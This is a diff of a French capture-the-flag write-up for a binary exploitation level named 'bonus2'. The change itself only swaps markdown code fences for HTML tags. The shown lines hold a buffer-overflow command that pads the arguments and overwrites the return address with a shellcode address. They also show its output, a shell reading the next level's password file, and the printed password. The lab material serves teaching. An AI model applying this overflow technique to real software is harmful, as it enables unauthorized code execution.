@@ -109,12 +109,11 @@ cd
 > On utilise donc le programme avec le premier argument plein, le second qui applique l'offset et l'adresse du shellcode.
 
 (on utilise LANG=nl dans cet exemple)
-```shell
-./bonus2 $(python -c 'print "A" * 50') $(python -c 'print "B" * OFFSET + "\x\x\x\x"')
+<pre><code>./bonus2 $(python -c 'print "A" * 50') $(python -c 'print "B" * OFFSET + "\x\x\x\x"')
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBm���
-$ cd ../bonus3 && cat .pass
+> cd ../bonus3 && cat .pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
-```
+</code></pre>
 
 For download :
 <pre><code>scp -P4242 bonus2@IP:bonus2 .</code></pre>
